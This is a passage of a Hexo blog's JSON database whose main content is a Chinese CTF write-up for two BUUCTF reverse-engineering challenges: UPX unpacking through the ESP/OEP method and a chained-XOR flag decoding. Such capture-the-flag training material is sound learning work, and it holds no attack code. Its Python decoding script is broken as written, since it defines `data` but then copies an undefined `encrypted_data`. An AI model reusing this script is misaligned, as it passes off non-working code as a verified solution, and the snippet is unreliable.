,{"_id":"public/2025/03/30/BUUCTF-reverse/unpack3.png","hash":"741f921134230a8b51019406588d5460f9cc8228","modified":1747150733940},{"_id":"public/2025/03/30/BUUCTF-reverse/unpack5.png","hash":"cce591357f802dd917636d677e4b7168f6c4c484","modified":1747150733940},{"_id":"public/2025/03/30/BUUCTF-reverse/unpack2.png","hash":"d98dca46224f72ad4e12380a8c813837f945b073","modified":1747150733940},{"_id":"public/2025/03/30/BUUCTF-reverse/unpack4.png","hash":"11d529cf0c63b1a2be3fb93484d2290fb5fb8ce4","modified":1747150733940},{"_id":"public/2025/05/13/W4terCTF-2025/微信图片_20250503193140.png","hash":"82b1d7da6aac933c08f5003a38e4e82af612db2d","modified":1747150733940},{"_id":"public/2025/05/13/W4terCTF-2025/微信图片_20250505110938.png","hash":"402493f125c4b54a0995dc68be64f89849c6d874","modified":1747150733940},{"_id":"public/webfonts/fa-light-300.woff2","hash":"def760895375328ccdcf62b2b9b9001a21947acd","modified":1747150733940},{"_id":"public/webfonts/fa-regular-400.woff2","hash":"486fed640153de1de84f460834c73daef060ed20","modified":1747150733940},{"_id":"public/webfonts/fa-duotone-900.woff2","hash":"2cc24434345b80a844a6bda1139539fe41e4df53","modified":1747150733940},{"_id":"public/2025/05/13/W4terCTF-2025/image-20250504170855720.png","hash":"7626c732843c92bbbd2341a3c9b8f8afba078627","modified":1747150733940},{"_id":"public/2025/05/13/W4terCTF-2025/image-20250504172003259.png","hash":"56bc2b6400fc06aae2c8f0d935a156b4bd7e653f","modified":1747150733940},{"_id":"public/2025/05/13/W4terCTF-2025/微信图片_20250503204222.png","hash":"8abe34a1f2557fe0b966d50cba68d4c25da3528c","modified":1747150733940},{"_id":"public/2025/05/13/W4terCTF-2025/微信图片_20250504140529.png","hash":"6a789a08a5333048626913e4e3821e20b4532ec1","modified":1747150733940},{"_id":"public/webfonts/fa-thin-100.woff2","hash":"e0a4482c20f6b67784df54965539a317a3bd681b","modified":1747150733940},{"_id":"public/2025/05/13/W4terCTF-2025/微信图片_20250504140829.png","hash":"ad13b95594582f8824bc53ff30eafd90c910d21a","modified":1747150733940},{"_id":"public/2025/05/13/W4terCTF-2025/微信图片_20250503200530.png","hash":"d15595ca8d4bad495538858b56114f7db9443f6d","modified":1747150733940},{"_id":"public/2025/05/13/W4terCTF-2025/微信图片_20250504155944.png","hash":"78039dd1dbd7ff71091745026be306eb63422497","modified":1747150733940},{"_id":"public/2025/05/13/W4terCTF-2025/微信图片_20250504170803.png","hash":"96d7cfb1044273f329e566f54042a6d3bddd715b","modified":1747150733940},{"_id":"public/2025/05/13/W4terCTF-2025/微信图片_20250504155659.png","hash":"285956bf670612b278ccd038adfae5939a2febd5","modified":1747150733940},{"_id":"public/2025/05/13/W4terCTF-2025/微信图片_20250503195004.png","hash":"8d00da03ccb4dd58bf712d026a404c2eb38addd5","modified":1747150733940},{"_id":"public/webfonts/fa-sharp-solid-900.ttf","hash":"0d710cd7bd1b7ff574e88bb812de82babe45e415","modified":1747150733940},{"_id":"public/2025/05/13/W4terCTF-2025/image-20250504163921288.png","hash":"a204215fabb230993bf03f2b12cb32a600ef5e0d","modified":1747150733940},{"_id":"public/2025/05/13/W4terCTF-2025/微信图片_20250503200140.png","hash":"3e38698e924a54c834714663edec9aec9dab95ad","modified":1747150733940},{"_id":"public/2025/05/13/W4terCTF-2025/微信图片_20250503193205.png","hash":"53598fc449f700db8cdcd53d111cc7654b0a3bb6","modified":1747150733940},{"_id":"public/2025/05/13/W4terCTF-2025/微信图片_20250503194142.png","hash":"2c497bed1bc8960b6c88a55a45b12b836021077f","modified":1747150733940},{"_id":"public/webfonts/fa-solid-900.ttf","hash":"40b536c3667547db70ee9ca6f3c94fbc33e0cab7","modified":1747150733940},{"_id":"public/2025/05/13/W4terCTF-2025/微信图片_20250503195311.png","hash":"39ff276f1135bc86bbc04bcb7af019e2ffcb3973","modified":1747150733940},{"_id":"public/webfonts/fa-regular-400.ttf","hash":"cdec068700dc440530e5bbeff7e8bb33a01b4132","modified":1747150733940},{"_id":"public/images/background.jpg","hash":"5094335088b47142d914115e7e072589286770dc","modified":1747150733940},{"_id":"public/js/libs/waline.mjs.map","hash":"37c5b3e6aa5e1b70358426345a1a1329d6b896d3","modified":1747150733940},{"_id":"public/webfonts/fa-light-300.ttf","hash":"cc5d9f4f994c82e23f58cdde1eec8792d81633c7","modified":1747150733940},{"_id":"public/webfonts/fa-thin-100.ttf","hash":"c1fee6e6986b14533ce022afada5fbe10c0f6562","modified":1747150733940},{"_id":"public/webfonts/fa-duotone-900.ttf","hash":"e0313a772ea710cb5ea4bd08f5dedb0a0025f8ca","modified":1747150733940},{"_id":"public/2025/05/13/W4terCTF-2025/微信图片_20250503194610.png","hash":"8aa32dab50508572c19ae84b3c04e3ed5d3be802","modified":1747150733940},{"_id":"public/2025/05/13/W4terCTF-2025/微信图片_20250503193150.png","hash":"daf0cee02a99f600e83411e01fa2f0e052cb02de","modified":1747150733940},{"_id":"public/2025/05/13/W4terCTF-2025/微信图片_20250503193223.png","hash":"f28902623bda11edf1185c4b7632beaaac708350","modified":1747150733940},{"_id":"public/2025/05/13/W4terCTF-2025/微信图片_20250503193419.png","hash":"baafc1f13c232b1849e39541e99f1d3dcba67c6d","modified":1747150733940},{"_id":"public/2025/05/13/W4terCTF-2025/微信图片_20250503194002.png","hash":"513d9caa09da186c5dd0353f828e4bf09ba27afb","modified":1747150733940},{"_id":"public/2025/05/13/W4terCTF-2025/微信图片_20250503193213.png","hash":"836318303c95c11108baa511710f8579c967bdc8","modified":1747150733940},{"_id":"public/js/libs/mermaid.min.js.map","hash":"2e1a632f0588c4370188887d79a10ff8b38a49b5","modified":1747150733940}],"Category":[],"Data":[{"_id":"links","data":[{"links_category":"双鸭山","has_thumbnail":false,"list":[{"name":"Yelia","link":"http://yelia.fun","description":"艰难即捷径","avatar":"https://yelia.fun/wp-content/uploads/2024/11/1731680146-touxiang.jpg"},{"name":"Uniya","link":"https://uniya.work/","description":"郑老师永远的神！","avatar":"https://uniya.work/favicon.png"},{"name":"深白色","link":"https://shen-baise.github.io/","description":"杰神——虔诚拜三拜","avater":"https://shen-baise.github.io/img/pic.jpg"}]},{"links_category":"膜拜大佬","has_thumbnail":false,"list":[{"name":"Wyaaaattwho","link":"http://blog.wyaaaattwho.xyz","description":"南大✌","avatar":"https://www.notion.so/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fbcc83a06-70e2-4332-93f9-b89147e2a6bd%2F8c491ea8-1469-4082-83e9-10dce4136cff%2F_.jpeg?table=collection&id=e49a506f-d4f7-4765-922b-75581ed41eff&t=e49a506f-d4f7-4765-922b-75581ed41eff&width=800&cache=v2"}]}]}],"Page":[{"title":"about_me","date":"2025-03-31T14:59:46.000Z","template":"about","_content":"\n\nwrite something...","source":"about-me/index.md","raw":"---\ntitle: about_me\ndate: 2025-03-31 22:59:46\ntemplate: about\n---\n\n\nwrite something...","updated":"2025-04-04T16:53:59.296Z","path":"about-me/index.html","comments":1,"layout":"page","_id":"cmamofqyz00008otkgrx8dl5i","content":"<p>write something…</p>\n","excerpt":"","more":"<p>write something…</p>\n","_processedHighlight":true},{"title":"Pomni's Friends","date":"2025-03-31T14:45:09.000Z","template":"links","_content":"","source":"links/index.md","raw":"---\ntitle: Pomni's Friends\ndate: 2025-03-31 22:45:09\ntemplate: links\n---\n","updated":"2025-04-04T16:53:59.310Z","path":"links/index.html","comments":1,"layout":"page","_id":"cmamofqz100018otk7qsk1jp0","content":"","excerpt":"","more":"","_processedHighlight":true}],"Post":[{"title":"BUUCTF reverse","date":"2025-03-30T11:54:37.000Z","excerpt":"rererererererererererererererererererere...","mathjax":true,"_content":"\n不知道怎么搞得,下午写的wp被\"rm -rf\"了🤣🤣🤣\n\n做re给我re成 Re: 从零开始的异世界生活 ...\n\n我现在情绪非常淡定,淡淡的死感罢了。\n\n# 新年快乐\n\n## 题目\n\n详见 [BUUUCTF 的这道题](https://buuoj.cn/challenges#%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90)\n\n## wp\n\n先放进IDA反编译，F5一下\n![alt text](check.png)\n发现函数很少，怀疑是加壳了。\n\n### 查壳\n![alt text](check.png)\n发现加了UPX壳，并且文件是32位的。\n\n### 脱壳\n\n#### 手动脱壳\n找到入口断点。\n![alt text](unpack1.png)\n\n然后设置这个地址为新的执行点。\n![alt text](unpack2.png)\n\n注意此时寄存器ESP地址\n![alt text](unpack3.png)\n\nF8执行异步后，ESP地址变化。\n![alt text](unpack4.png)\n\n在内存窗口打开变化后的地址，设置为新的硬件断点，并执行\n![alt text](unpack5.png)\n\n发现断点。找到popad，其后的第一个jump即为OEP。\n\n![alt text](unpack6.png)\n\n用插件dump掉壳，然后autoresearch IAT，并导入IAT，fix之前掉壳的文件。\n\n最后拖进IDA，就可以看到脱壳后的程序反编译的结果了。结合题目提示，字符串即flag。\n![alt text](ida2.png)\n\n#### 工具脱壳\n\n用upx的工具进行脱壳，脱壳后的文件拖进IDA结果一致。\n![alt text](unpackbytool.png)\n\n## 笔记\n\n{% note red 壳 %}\n[脱壳——UPX脱壳原理](https://www.cnblogs.com/Sna1lGo/p/14727846.html)\n[加壳与脱壳理论详解](https://www.cnblogs.com/cainiao-chuanqi/p/14763537.html)\n{% endnote %}\n\n# XOR\n\n拖进IDA，F5一下\n![alt text](xor1.png)\n\n反编译结果大概是说，输入的flag字符串v5，从v5[1]开始和前一个字符做异或得到global。\n\n找到global\n![alt text](9e648f5389fd8773bc25dc43ff5c516.png)\n\n提取字符串并转换成ascll码\n\n```\ndata=[\n\t0x66, 0x0A, 0x6B, 0x0C, 0x77, 0x26, 0x4F, 0x2E, 0x40, 0x11,\n    0x78, 0x0D, 0x5A, 0x3B, 0x55, 0x11, 0x70, 0x19, 0x46, 0x1F,\n    0x76, 0x22, 0x4D, 0x23, 0x44, 0x0E, 0x67, 0x06, 0x68, 0x0F,\n    0x47, 0x32, 0x4F\n]\n```\n\n由\n\n$$\n\\begin{aligned}\ns[i]' &= s[i] \\oplus s[i-1] \\\\\ns[i] &= s[i]' \\oplus s[i-1]\n\\end{aligned}\n$$\n脚本：\n\n```python\ndata = [\n    0x66, 0x0A, 0x6B, 0x0C, 0x77, 0x26, 0x4F, 0x2E, 0x40, 0x11,\n    0x78, 0x0D, 0x5A, 0x3B, 0x55, 0x11, 0x70, 0x19, 0x46, 0x1F,\n    0x76, 0x22, 0x4D, 0x23, 0x44, 0x0E, 0x67, 0x06, 0x68, 0x0F,\n    0x47, 0x32, 0x4F\n]\n\ndecrypted = encrypted_data.copy()\nfor i in range(len(decrypted)-1, 0, -1):\n    decrypted[i] ^= decrypted[i-1]\n\nflag = bytes(decrypted).decode('utf-8')\nprint(\"Decrypted Flag:\", flag)\n```\n\n拿到flag\n\n![alt text](8e4bbdacde59d80c8db2706f79dca28.png)\n","source":"_posts/BUUCTF-reverse.md","raw":"---\ntitle: BUUCTF reverse\ndate: 2025-03-30 19:54:37\ntags: CTF\nexcerpt: rererererererererererererererererererere...\nmathjax: true\n---\n\n不知道怎么搞得,下午写的wp被\"rm -rf\"了🤣🤣🤣\n\n做re给我re成 Re: 从零开始的异世界生活 ...\n\n我现在情绪非常淡定,淡淡的死感罢了。\n\n# 新年快乐\n\n## 题目\n\n详见 [BUUUCTF 的这道题](https://buuoj.cn/challenges#%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90)\n\n## wp\n\n先放进IDA反编译，F5一下\n![alt text](check.png)\n发现函数很少，怀疑是加壳了。\n\n### 查壳\n![alt text](check.png)\n发现加了UPX壳，并且文件是32位的。\n\n### 脱壳\n\n#### 手动脱壳\n找到入口断点。\n![alt text](unpack1.png)\n\n然后设置这个地址为新的执行点。\n![alt text](unpack2.png)\n\n注意此时寄存器ESP地址\n![alt text](unpack3.png)\n\nF8执行异步后，ESP地址变化。\n![alt text](unpack4.png)\n\n在内存窗口打开变化后的地址，设置为新的硬件断点，并执行\n![alt text](unpack5.png)\n\n发现断点。找到popad，其后的第一个jump即为OEP。\n\n![alt text](unpack6.png)\n\n用插件dump掉壳，然后autoresearch IAT，并导入IAT，fix之前掉壳的文件。\n\n最后拖进IDA，就可以看到脱壳后的程序反编译的结果了。结合题目提示，字符串即flag。\n![alt text](ida2.png)\n\n#### 工具脱壳\n\n用upx的工具进行脱壳，脱壳后的文件拖进IDA结果一致。\n![alt text](unpackbytool.png)\n\n## 笔记\n\n{% note red 壳 %}\n[脱壳——UPX脱壳原理](https://www.cnblogs.com/Sna1lGo/p/14727846.html)\n[加壳与脱壳理论详解](https://www.cnblogs.com/cainiao-chuanqi/p/14763537.html)\n{% endnote %}\n\n# XOR\n\n拖进IDA，F5一下\n![alt text](xor1.png)\n\n反编译结果大概是说，输入的flag字符串v5，从v5[1]开始和前一个字符做异或得到global。\n\n找到global\n![alt text](9e648f5389fd8773bc25dc43ff5c516.png)\n\n提取字符串并转换成ascll码\n\n```\ndata=[\n\t0x66, 0x0A, 0x6B, 0x0C, 0x77, 0x26, 0x4F, 0x2E, 0x40, 0x11,\n    0x78, 0x0D, 0x5A, 0x3B, 0x55, 0x11, 0x70, 0x19, 0x46, 0x1F,\n    0x76, 0x22, 0x4D, 0x23, 0x44, 0x0E, 0x67, 0x06, 0x68, 0x0F,\n    0x47, 0x32, 0x4F\n]\n```\n\n由\n\n$$\n\\begin{aligned}\ns[i]' &= s[i] \\oplus s[i-1] \\\\\ns[i] &= s[i]' \\oplus s[i-1]\n\\end{aligned}\n$$\n脚本：\n\n```python\ndata = [\n    0x66, 0x0A, 0x6B, 0x0C, 0x77, 0x26, 0x4F, 0x2E, 0x40, 0x11,\n    0x78, 0x0D, 0x5A, 0x3B, 0x55, 0x11, 0x70, 0x19, 0x46, 0x1F,\n    0x76, 0x22, 0x4D, 0x23, 0x44, 0x0E, 0x67, 0x06, 0x68, 0x0F,\n    0x47, 0x32, 0x4F\n]\n\ndecrypted = encrypted_data.copy()\nfor i in range(len(decrypted)-1, 0, -1):\n    decrypted[i] ^= decrypted[i-1]\n\nflag = bytes(decrypted).decode('utf-8')\nprint(\"Decrypted Flag:\", flag)\n```\n\n拿到flag\n\n![alt text](8e4bbdacde59d80c8db2706f79dca28.png)\n","slug":"BUUCTF-reverse","published":1,"updated":"2025-04-04T18:19:45.356Z","comments":1,"layout":"post","photos":[],"_id":"cmamofqz200028otkdw8idd0v","content":"<p>不知道怎么搞得,下午写的wp被”rm -rf”了🤣🤣🤣</p>\n<p>做re给我re成 Re: 从零开始的异世界生活 …</p>\n<p>我现在情绪非常淡定,淡淡的死感罢了。</p>\n<h1 id=\"新年快乐\"><a href=\"#新年快乐\" class=\"headerlink\" title=\"新年快乐\"></a>新年快乐</h1><h2 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h2><p>详见 <a class=\"link\" href=\"https://buuoj.cn/challenges#%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90\">BUUUCTF 的这道题<i class=\"fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon\"></i></a></p>\n<h2 id=\"wp\"><a href=\"#wp\" class=\"headerlink\" title=\"wp\"></a>wp</h2><p>先放进IDA反编译，F5一下<br><img lazyload=\"\" src=\"/images/loading.svg\" data-src=\"check.png\" alt=\"alt text\"><br>发现函数很少，怀疑是加壳了。</p>\n<h3 id=\"查壳\"><a href=\"#查壳\" class=\"headerlink\" title=\"查壳\"></a>查壳</h3><p><img lazyload=\"\" src=\"/images/loading.svg\" data-src=\"check.png\" alt=\"alt text\"><br>发现加了UPX壳，并且文件是32位的。</p>\n<h3 id=\"脱壳\"><a href=\"#脱壳\" class=\"headerlink\" title=\"脱壳\"></a>脱壳</h3><h4 id=\"手动脱壳\"><a href=\"#手动脱壳\" class=\"headerlink\" title=\"手动脱壳\"></a>手动脱壳</h4><p>找到入口断点。<br><img lazyload=\"\" src=\"/images/loading.svg\" data-src=\"unpack1.png\" alt=\"alt text\"></p>\n<p>然后设置这个地址为新的执行点。<br><img lazyload=\"\" src=\"/images/loading.svg\" data-src=\"unpack2.png\" alt=\"alt text\"></p>\n<p>注意此时寄存器ESP地址<br><img lazyload=\"\" src=\"/images/loading.svg\" data-src=\"unpack3.png\" alt=\"alt text\"></p>\n<p>F8执行异步后，ESP地址变化。<br><img lazyload=\"\" src=\"/images/loading.svg\" data-src=\"unpack4.png\" alt=\"alt text\"></p>\n<p>在内存窗口打开变化后的地址，设置为新的硬件断点，并执行<br><img lazyload=\"\" src=\"/images/loading.svg\" data-src=\"unpack5.png\" alt=\"alt text\"></p>\n<p>发现断点。找到popad，其后的第一个jump即为OEP。</p>\n<p><img lazyload=\"\" src=\"/images/loading.svg\" data-src=\"unpack6.png\" alt=\"alt text\"></p>\n<p>用插件dump掉壳，然后autoresearch IAT，并导入IAT，fix之前掉壳的文件。</p>\n<p>最后拖进IDA，就可以看到脱壳后的程序反编译的结果了。结合题目提示，字符串即flag。<br><img lazyload=\"\" src=\"/images/loading.svg\" data-src=\"ida2.png\" alt=\"alt text\"></p>\n<h4 id=\"工具脱壳\"><a href=\"#工具脱壳\" class=\"headerlink\" title=\"工具脱壳\"></a>工具脱壳</h4><p>用upx的工具进行脱壳，脱壳后的文件拖进IDA结果一致。<br><img lazyload=\"\" src=\"/images/loading.svg\" data-src=\"unpackbytool.png\" alt=\"alt text\"></p>\n<h2 id=\"笔记\"><a href=\"#笔记\" class=\"headerlink\" title=\"笔记\"></a>笔记</h2>\n  <div class=\"note p-4 mb-4 rounded-small red 壳\">\n    <p><a class=\"link\" href=\"https://www.cnblogs.com/Sna1lGo/p/14727846.html\">脱壳——UPX脱壳原理<i class=\"fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon\"></i></a><br><a class=\"link\" href=\"https://www.cnblogs.com/cainiao-chuanqi/p/14763537.html\">加壳与脱壳理论详解<i class=\"fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon\"></i></a></p>\n\n  </div>\n<h1 id=\"XOR\"><a href=\"#XOR\" class=\"headerlink\" title=\"XOR\"></a>XOR</h1><p>拖进IDA，F5一下<br><img lazyload=\"\" src=\"/images/loading.svg\" data-src=\"xor1.png\" alt=\"alt text\"></p>\n<p>反编译结果大概是说，输入的flag字符串v5，从v5[1]开始和前一个字符做异或得到global。</p>\n<p>找到global<br><img lazyload=\"\" src=\"/images/loading.svg\" data-src=\"9e648f5389fd8773bc25dc43ff5c516.png\" alt=\"alt text\"></p>\n<p>提取字符串并转换成ascll码</p>\n<div class=\"code-container\" data-rel=\"Plaintext\"><figure class=\"iseeu highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data=[</span><br><span class=\"line\">\t0x66, 0x0A, 0x6B, 0x0C, 0x77, 0x26, 0x4F, 0x2E, 0x40, 0x11,</span><br><span class=\"line\">    0x78, 0x0D, 0x5A, 0x3B, 0x55, 0x11, 0x70, 0x19, 0x46, 0x1F,</span><br><span class=\"line\">    0x76, 0x22, 0x4D, 0x23, 0x44, 0x0E, 0x67, 0x06, 0x68, 0x0F,</span><br><span class=\"line\">    0x47, 0x32, 0x4F</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure></div>\n<p>由</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\ns[i]' &= s[i] \\oplus s[i-1] \\\\\ns[i] &= s[i]' \\oplus s[i-1]\n\\end{aligned}</script><p>脚本：</p>\n<div class=\"code-container\" data-rel=\"Python\"><figure class=\"iseeu highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data = [</span><br><span class=\"line\">    <span class=\"number\">0x66</span>, <span class=\"number\">0x0A</span>, <span class=\"number\">0x6B</span>, <span class=\"number\">0x0C</span>, <span class=\"number\">0x77</span>, <span class=\"number\">0x26</span>, <span class=\"number\">0x4F</span>, <span class=\"number\">0x2E</span>, <span class=\"number\">0x40</span>, <span class=\"number\">0x11</span>,</span><br><span class=\"line\">    <span class=\"number\">0x78</span>, <span class=\"number\">0x0D</span>, <span class=\"number\">0x5A</span>, <span class=\"number\">0x3B</span>, <span class=\"number\">0x55</span>, <span class=\"number\">0x11</span>, <span class=\"number\">0x70</span>, <span class=\"number\">0x19</span>, <span class=\"number\">0x46</span>, <span class=\"number\">0x1F</span>,</span><br><span class=\"line\">    <span class=\"number\">0x76</span>, <span class=\"number\">0x22</span>, <span class=\"number\">0x4D</span>, <span class=\"number\">0x23</span>, <span class=\"number\">0x44</span>, <span class=\"number\">0x0E</span>, <span class=\"number\">0x67</span>, <span class=\"number\">0x06</span>, <span class=\"number\">0x68</span>, <span class=\"number\">0x0F</span>,</span><br><span class=\"line\">    <span class=\"number\">0x47</span>, <span class=\"number\">0x32</span>, <span class=\"number\">0x4F</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">decrypted = encrypted_data.copy()</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(decrypted)-<span class=\"number\">1</span>, <span class=\"number\">0</span>, -<span class=\"number\">1</span>):</span><br><span class=\"line\">    decrypted[i] ^= decrypted[i-<span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">flag = <span class=\"built_in\">bytes</span>(decrypted).decode(<span class=\"string\">'utf-8'</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">\"Decrypted Flag:\"</span>, flag)</span><br></pre></td></tr></table></figure></div>\n<p>拿到flag</p>\n<p><img lazyload=\"\" src=\"/images/loading.svg\" data-src=\"8e4bbdacde59d80c8db2706f79dca28.png\" alt=\"alt text\"></p>\n","more":"<p>不知道怎么搞得,下午写的wp被”rm -rf”了🤣🤣🤣</p>\n<p>做re给我re成 Re: 从零开始的异世界生活 …</p>\n<p>我现在情绪非常淡定,淡淡的死感罢了。</p>\n<h1 id=\"新年快乐\"><a href=\"#新年快乐\" class=\"headerlink\" title=\"新年快乐\"></a>新年快乐</h1><h2 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h2><p>详见 <a class=\"link\" href=\"https://buuoj.cn/challenges#%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90\">BUUUCTF 的这道题<i class=\"fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon\"></i></a></p>\n<h2 id=\"wp\"><a href=\"#wp\" class=\"headerlink\" title=\"wp\"></a>wp</h2><p>先放进IDA反编译，F5一下<br><img lazyload=\"\" src=\"/images/loading.svg\" data-src=\"check.png\" alt=\"alt text\"><br>发现函数很少，怀疑是加壳了。</p>\n<h3 id=\"查壳\"><a href=\"#查壳\" class=\"headerlink\" title=\"查壳\"></a>查壳</h3><p><img lazyload=\"\" src=\"/images/loading.svg\" data-src=\"check.png\" alt=\"alt text\"><br>发现加了UPX壳，并且文件是32位的。</p>\n<h3 id=\"脱壳\"><a href=\"#脱壳\" class=\"headerlink\" title=\"脱壳\"></a>脱壳</h3><h4 id=\"手动脱壳\"><a href=\"#手动脱壳\" class=\"headerlink\" title=\"手动脱壳\"></a>手动脱壳</h4><p>找到入口断点。<br><img lazyload=\"\" src=\"/images/loading.svg\" data-src=\"unpack1.png\" alt=\"alt text\"></p>\n<p>然后设置这个地址为新的执行点。<br><img lazyload=\"\" src=\"/images/loading.svg\" data-src=\"unpack2.png\" alt=\"alt text\"></p>\n<p>注意此时寄存器ESP地址<br><img lazyload=\"\" src=\"/images/loading.svg\" data-src=\"unpack3.png\" alt=\"alt text\"></p>\n<p>F8执行异步后，ESP地址变化。<br><img lazyload=\"\" src=\"/images/loading.svg\" data-src=\"unpack4.png\" alt=\"alt text\"></p>\n<p>在内存窗口打开变化后的地址，设置为新的硬件断点，并执行<br><img lazyload=\"\" src=\"/images/loading.svg\" data-src=\"unpack5.png\" alt=\"alt text\"></p>\n<p>发现断点。找到popad，其后的第一个jump即为OEP。</p>\n<p><img lazyload=\"\" src=\"/images/loading.svg\" data-src=\"unpack6.png\" alt=\"alt text\"></p>\n<p>用插件dump掉壳，然后autoresearch IAT，并导入IAT，fix之前掉壳的文件。</p>\n<p>最后拖进IDA，就可以看到脱壳后的程序反编译的结果了。结合题目提示，字符串即flag。<br><img lazyload=\"\" src=\"/images/loading.svg\" data-src=\"ida2.png\" alt=\"alt text\"></p>\n<h4 id=\"工具脱壳\"><a href=\"#工具脱壳\" class=\"headerlink\" title=\"工具脱壳\"></a>工具脱壳</h4><p>用upx的工具进行脱壳，脱壳后的文件拖进IDA结果一致。<br><img lazyload=\"\" src=\"/images/loading.svg\" data-src=\"unpackbytool.png\" alt=\"alt text\"></p>\n<h2 id=\"笔记\"><a href=\"#笔记\" class=\"headerlink\" title=\"笔记\"></a>笔记</h2>\n  <div class=\"note p-4 mb-4 rounded-small red 壳\">\n    <p><a class=\"link\" href=\"https://www.cnblogs.com/Sna1lGo/p/14727846.html\">脱壳——UPX脱壳原理<i class=\"fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon\"></i></a><br><a class=\"link\" href=\"https://www.cnblogs.com/cainiao-chuanqi/p/14763537.html\">加壳与脱壳理论详解<i class=\"fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon\"></i></a></p>\n\n  </div>\n<h1 id=\"XOR\"><a href=\"#XOR\" class=\"headerlink\" title=\"XOR\"></a>XOR</h1><p>拖进IDA，F5一下<br><img lazyload=\"\" src=\"/images/loading.svg\" data-src=\"xor1.png\" alt=\"alt text\"></p>\n<p>反编译结果大概是说，输入的flag字符串v5，从v5[1]开始和前一个字符做异或得到global。</p>\n<p>找到global<br><img lazyload=\"\" src=\"/images/loading.svg\" data-src=\"9e648f5389fd8773bc25dc43ff5c516.png\" alt=\"alt text\"></p>\n<p>提取字符串并转换成ascll码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data=[</span><br><span class=\"line\">\t0x66, 0x0A, 0x6B, 0x0C, 0x77, 0x26, 0x4F, 0x2E, 0x40, 0x11,</span><br><span class=\"line\">    0x78, 0x0D, 0x5A, 0x3B, 0x55, 0x11, 0x70, 0x19, 0x46, 0x1F,</span><br><span class=\"line\">    0x76, 0x22, 0x4D, 0x23, 0x44, 0x0E, 0x67, 0x06, 0x68, 0x0F,</span><br><span class=\"line\">    0x47, 0x32, 0x4F</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n<p>由</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\ns[i]' &= s[i] \\oplus s[i-1] \\\\\ns[i] &= s[i]' \\oplus s[i-1]\n\\end{aligned}</script><p>脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data = [</span><br><span class=\"line\">    <span class=\"number\">0x66</span>, <span class=\"number\">0x0A</span>, <span class=\"number\">0x6B</span>, <span class=\"number\">0x0C</span>, <span class=\"number\">0x77</span>, <span class=\"number\">0x26</span>, <span class=\"number\">0x4F</span>, <span class=\"number\">0x2E</span>, <span class=\"number\">0x40</span>, <span class=\"number\">0x11</span>,</span><br><span class=\"line\">    <span class=\"number\">0x78</span>, <span class=\"number\">0x0D</span>, <span class=\"number\">0x5A</span>, <span class=\"number\">0x3B</span>, <span class=\"number\">0x55</span>, <span class=\"number\">0x11</span>, <span class=\"number\">0x70</span>, <span class=\"number\">0x19</span>, <span class=\"number\">0x46</span>, <span class=\"number\">0x1F</span>,</span><br><span class=\"line\">    <span class=\"number\">0x76</span>, <span class=\"number\">0x22</span>, <span class=\"number\">0x4D</span>, <span class=\"number\">0x23</span>, <span class=\"number\">0x44</span>, <span class=\"number\">0x0E</span>, <span class=\"number\">0x67</span>, <span class=\"number\">0x06</span>, <span class=\"number\">0x68</span>, <span class=\"number\">0x0F</span>,</span><br><span class=\"line\">    <span class=\"number\">0x47</span>, <span class=\"number\">0x32</span>, <span class=\"number\">0x4F</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\">decrypted = encrypted_data.copy()</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(decrypted)-<span class=\"number\">1</span>, <span class=\"number\">0</span>, -<span class=\"number\">1</span>):</span><br><span class=\"line\">    decrypted[i] ^= decrypted[i-<span class=\"number\">1</span>]</span><br><span 